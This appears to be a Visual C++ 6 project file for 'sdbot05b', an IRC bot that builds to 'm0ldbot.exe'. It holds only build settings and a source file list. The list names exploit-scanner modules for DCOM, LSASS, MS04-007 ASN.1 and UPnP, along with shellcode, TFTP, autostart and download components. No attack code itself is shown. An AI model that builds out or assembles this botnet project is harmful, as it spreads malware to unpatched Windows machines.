# Microsoft Developer Studio Project File - Name="sdbot05b" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** NICHT BEARBEITEN **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=SDBOT05B - WIN32 RELEASE
!MESSAGE Dies ist kein gültiges Makefile. Zum Erstellen dieses Projekts mit NMAKE
!MESSAGE verwenden Sie den Befehl "Makefile exportieren" und führen Sie den Befehl
!MESSAGE 
!MESSAGE NMAKE /f "sdbot05b.mak".
!MESSAGE 
!MESSAGE Sie können beim Ausführen von NMAKE eine Konfiguration angeben
!MESSAGE durch Definieren des Makros CFG in der Befehlszeile. Zum Beispiel:
!MESSAGE 
!MESSAGE NMAKE /f "sdbot05b.mak" CFG="SDBOT05B - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Für die Konfiguration stehen zur Auswahl:
!MESSAGE 
!MESSAGE "sdbot05b - Win32 Release" (basierend auf  "Win32 (x86) Application")
!MESSAGE "sdbot05b - Win32 Debug" (basierend auf  "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "sdbot05b - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib ws2_32.lib wininet.lib Netapi32.lib shlwapi.lib Mpr.lib Dnsapi.lib /nologo /subsystem:windows /machine:I386 /out:"bin/m0ldbot.exe" /align:4096
# SUBTRACT LINK32 /pdb:none

!ELSEIF  "$(CFG)" == "sdbot05b - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "debug"
# PROP BASE Intermediate_Dir "debug"
# PROP BASE Ignore_Export_Lib 0
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "debug"
# PROP Intermediate_Dir "debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /D "_DEBUG" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib ws2_32.lib wininet.lib /nologo /subsystem:windows /machine:I386 /align:4096
# SUBTRACT BASE LINK32 /pdb:none
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib ws2_32.lib wininet.lib Netapi32.lib shlwapi.lib Mpr.lib Dnsapi.lib /nologo /subsystem:windows /machine:I386 /align:4096
# SUBTRACT LINK32 /pdb:none

!ENDIF 

# Begin Target

# Name "sdbot05b - Win32 Release"
# Name "sdbot05b - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "scanners"

# PROP Default_Filter "cpp"
# Begin Source File

SOURCE=.\sources\adlp.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\advscan.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\dcom.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\lsass.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\ms04_007_asn1.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\shellcode.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\tftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\upnp.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\sources\aliaslog.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\AutoStart.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\fphost.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\ftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\hostauth.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\irc_send.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\loaddll.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\netutils.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\rndnick.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\sdbot05b.cpp
# ADD CPP /O1
# End Source File
# Begin Source File

SOURCE=.\sources\threads.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;"
# Begin Group "scanner headers"

# PROP Default_Filter "h"
# Begin Source File

SOURCE=.\includes\advscan.h
# End Source File
# Begin Source File

SOURCE=.\includes\dcom.h
# End Source File
# Begin Source File

SOURCE=.\includes\lsass.h
# End Source File
# Begin Source File

SOURCE=.\includes\ms04_007_asn1.h
# End Source File
# Begin Source File

SOURCE=.\includes\shellcode.h
# End Source File
# Begin Source File

SOURCE=.\includes\tftpd.h
# End Source File
# Begin Source File

SOURCE=.\includes\upnp.h
# End Source File
# End Group
# Begin Group "protocal headers"

# PROP Default_Filter ""
# End Group
# Begin Source File

SOURCE=.\includes\aliaslog.h
# End Source File
# Begin Source File

SOURCE=.\includes\autostart.h
# End Source File
# Begin Source File

SOURCE=.\includes\commands.h
# End Source File
# Begin Source File

SOURCE=.\config.h
# End Source File
# Begin Source File

SOURCE=.\includes\defines.h
# End Source File
# Begin Source File

SOURCE=.\includes\download.h
# End Source File
# Begin Source File

SOURCE=.\includes\fphost.h
# End Source File
# Begin Source File

SOURCE=.\includes\ftpd.h
# End Source File
# Begin Source File

SOURCE=.\includes\functions.h
# End Source File
# Begin Source File

SOURCE=.\includes\hostauth.h
# End Source File
# Begin Source File

SOURCE=.\includes\identd.h
# End Source File
# Begin Source File

SOURCE=.\includes\Includes.h
# End Source File
# Begin Source File

SOURCE=.\includes\irc_send.h
# End Source File
# Begin Source File

SOURCE=.\includes\loaddll.h
# End Source File
# Begin Source File

SOURCE=.\includes\misc.h
# End Source File
# Begin Source File

SOURCE=.\includes\netheaders.h
# End Source File
# Begin Source File

SOURCE=.\includes\netutils.h
# End Source File
# Begin Source File

SOURCE=.\includes\rndnick.h
# End Source File
# Begin Source File

SOURCE=.\includes\sdbot05b.h
# End Source File
# Begin Source File

SOURCE=.\includes\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\includes\threads.h
# End Source File
# End Group
# End Target
# End Project
